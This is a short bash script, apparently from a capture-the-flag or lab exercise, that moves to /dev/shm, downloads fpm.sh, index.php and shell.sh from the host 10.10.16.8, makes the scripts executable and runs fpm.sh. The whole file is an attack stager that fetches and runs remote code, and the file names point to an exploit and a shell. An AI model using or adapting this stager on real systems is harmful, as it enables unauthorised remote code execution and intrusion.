#!/bin/bash

cd /dev/shm
wget http://10.10.16.8/fpm.sh
wget http://10.10.16.8/index.php
wget http://10.10.16.8/shell.sh
chmod +x fpm.sh
chmod +x shell.sh
bash fpm.sh
